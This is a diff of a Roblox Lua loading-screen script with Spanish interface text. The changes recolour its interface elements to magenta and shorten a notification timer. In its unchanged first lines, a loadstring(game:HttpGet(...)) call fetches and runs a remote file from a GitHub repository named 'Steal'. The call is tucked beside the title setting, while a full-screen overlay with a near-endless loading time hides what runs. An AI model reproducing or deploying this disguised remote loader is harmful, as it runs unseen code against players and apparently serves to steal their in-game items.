@@ -1,6 +1,6 @@
 --settings:
 loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptsop13/Steal/refs/heads/main/Jhonaiker.lua'))() title = "Cargando Script" --upper title
-local loading_text = "Porfavor espera" --gray title
+local loading_text = "Porfavor espera" --blue title
 local loadingtime = 50000000000 --loading time (in seconds)
 
 --credits to arko2230 !
@@ -17,14 +17,14 @@ pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end)
 local Frame = Instance.new("Frame")
 Frame.Parent = ScreenGui
 Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-Frame.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
 Frame.BackgroundTransparency = 0.2
 Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
 Frame.Size = UDim2.new(1, 0, 1, 0)
 
 local Frame_2 = Instance.new("Frame")
 Frame_2.Parent = Frame
-Frame_2.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
 Frame_2.Position = UDim2.new(0.3748, 0, 0.3706, 0)
 Frame_2.Size = UDim2.new(0.2495, 0, 0.2574, 0)
 
@@ -33,23 +33,23 @@ UICorner.Parent = Frame_2
 
 local name = Instance.new("TextLabel")
 name.Parent = Frame_2
-name.BackgroundTransparency = 1
+name.BackgroundTransparency = 0
 name.Position = UDim2.new(0, 0, 0.0501, 0)
 name.Size = UDim2.new(1, 0, 0.1642, 0)
 name.Font = Enum.Font.FredokaOne
 name.Text = title
-name.TextColor3 = Color3.fromRGB(255, 255, 255)
+name.TextColor3 = Color3.fromRGB(255, 0, 255)
 name.TextScaled = true
 name.TextWrapped = true
 
 local loadingtext = Instance.new("TextLabel")
 loadingtext.Parent = Frame_2
-loadingtext.BackgroundTransparency = 1
+loadingtext.BackgroundTransparency = 0
 loadingtext.Position = UDim2.new(0.161, 0, 0.2138, 0)
 loadingtext.Size = UDim2.new(0.6774, 0, 0.1207, 0)
 loadingtext.Font = Enum.Font.FredokaOne
 loadingtext.Text = loading_text
-loadingtext.TextColor3 = Color3.fromRGB(97, 97, 97)
+loadingtext.TextColor3 = Color3.fromRGB(255, 0, 255)
 loadingtext.TextScaled = true
 loadingtext.TextWrapped = true
 
@@ -63,7 +63,7 @@ Dots.Size = UDim2.new(0.4167, 0, 0.2556, 0)
 local function createDot(parent, position)
     local dot = Instance.new("Frame")
     dot.Parent = parent
-    dot.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    dot.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
     dot.Position = position
     dot.Size = UDim2.new(0.1593, 0, 0.5116, 0)
     local uic = Instance.new("UICorner", dot)
@@ -75,7 +75,7 @@ local function createDot(parent, position)
     inside.AnchorPoint = Vector2.new(0.5, 0.5)
     inside.Position = UDim2.new(0.5, 0, 0.5, 0)
     inside.Size = UDim2.new(0, 0, 0, 0)
-    inside.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    inside.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
     Instance.new("UICorner", inside).CornerRadius = UDim.new(0.5, 0)
 
     return dot
@@ -87,7 +87,7 @@ local Dot3 = createDot(Dots, UDim2.new(0.7788, 0, 0.2344, 0))
 
 local seperator = Instance.new("Frame")
 seperator.Parent = Frame_2
-seperator.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+seperator.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
 seperator.Position = UDim2.new(0, 0, 0.3651, 0)
 seperator.Size = UDim2.new(1, 0, 0.0267, 0)
 
@@ -132,11 +132,11 @@ notifyLabel.Position = UDim2.new(0, 0, 0, 0)
 notifyLabel.Size = UDim2.new(1, 0, 1, 0)
 notifyLabel.Font = Enum.Font.FredokaOne
 notifyLabel.Text = "Hola, gracias por usar Overdrive ✅"
-notifyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+notifyLabel.TextColor3 = Color3.fromRGB(255, 0, 255)
 notifyLabel.TextScaled = true
 notifyLabel.TextWrapped = true
 
-task.wait(10) -- Show for 10 seconds
+task.wait(5) -- Show for 10 seconds
 notification:Destroy()
 
 -- Este wait es simbólico, puedes quitarlo si quieres que nunca desaparezca
